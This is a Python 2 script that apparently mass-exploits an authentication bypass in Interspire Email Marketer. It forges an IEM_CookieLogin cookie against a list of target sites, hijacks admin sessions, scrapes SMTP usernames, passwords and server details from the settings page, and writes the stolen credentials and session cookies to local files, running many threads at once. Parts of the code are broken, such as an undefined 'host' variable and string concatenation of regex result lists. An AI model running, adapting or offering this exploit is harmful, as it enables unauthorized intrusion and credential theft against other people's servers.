# -*- coding: utf-8 -*-

import sys, requests, re, time, os
from bs4 import BeautifulSoup
from pprint import pprint
from Queue import Queue
from threading import Thread

try:
	os.mkdir("cms")
except:
	pass

""" Configure Headers """
header = {"User-agent":"Linux Mozilla 7.0"}


class Worker(Thread):
	def __init__(self, tasks):
		Thread.__init__(self)
		self.tasks = tasks
		self.daemon = True
		self.start()

	def run(self):
		while True:
			func, args, kargs = self.tasks.get()
			try: func(*args, **kargs)
			except Exception, e: print e
			self.tasks.task_done()

class ThreadPool:
	def __init__(self, num_threads):
		self.tasks = Queue(num_threads)
		for _ in range(num_threads): Worker(self.tasks)

	def add_task(self, func, *args, **kargs):
		self.tasks.put((func, args, kargs))

	def wait_completion(self):
		self.tasks.join()



def exploit(url):
	s = requests.Session()
	s.get(url, timeout=8)
	r = s.get(url, timeout=8)
	response_regex = r.text
	# requesting initial Cookie
	for key,value in s.cookies.items():
		if key and "IEMSESSIONID" in key:
			s.cookies.set('IEM_CookieLogin', "YTo0OntzOjQ6InVzZXIiO3M6MToiMSI7czo0OiJ0aW1lIjtpOjE1MDU0NzcyOTQ7czo0OiJyYW5kIjtiOjE7czo4OiJ0YWtlbWV0byI7czo5OiJpbmRleC5waHAiO30%3D")
	r = s.get(url, timeout=8)
	response_regex2 = r.text
	if response_regex != response_regex2:
		for key,value in s.cookies.items():
			if "IEMSESSIONID" in key:
				try:
					r = s.get(url+"?Page=Settings&Tab=2")
					user = re.findall('id="smtp_u" value="(.*?)"', r.text)
					pswd = re.findall('id="smtp_p" value="(.*?)"', r.text)
					port = re.findall('id="smtp_port" value="(.*?)"', r.text)
					srve = re.findall('id="smtp_server" value="(.*?)"', r.text)
					if user and pswd and str(port) and srve:
						smtp = host+"|"+port+"|"+user+"|"+pswd
					else:
						smtp = False
					if smtp:
						save = open("iem_smtps.txt","a")
						save.write(smtp+"\n".replace("\r",""))
						save.close()
				except:
					pass
				return value,r.text


def main(url):
	try:
		session_rider_value,content = exploit(url)
		if session_rider_value:
			print(url+" | \033[32;1m"+session_rider_value+"\033[0m")
			saved = open("magic_cookies.txt","a")
			tsv = url+"|"+session_rider_value
			ppp = tsv.replace("\r", tsv)
			saved.write(ppp+"\n")
			saved.close()
		else:
			print(url+" - \033[31;1mIsn't vulnerable\033[0m\n"),
	except Exception as err:
		print(url+" - \033[31;1mIsn't vulnerable\033[0m\n"),

if __name__ == '__main__':
	try:
		lists = sys.argv[1]
		numthread = sys.argv[2]
	except:
		print("python script.py websitelist.txt thread")
		exit()

	pool = ThreadPool(int(numthread))
	readsplit = open(lists).read().splitlines()
	for url in readsplit:
		if "://" in url:
			url = url
		else:
			url = "http://"+url
		pool.add_task(main, url)
	pool.wait_completion()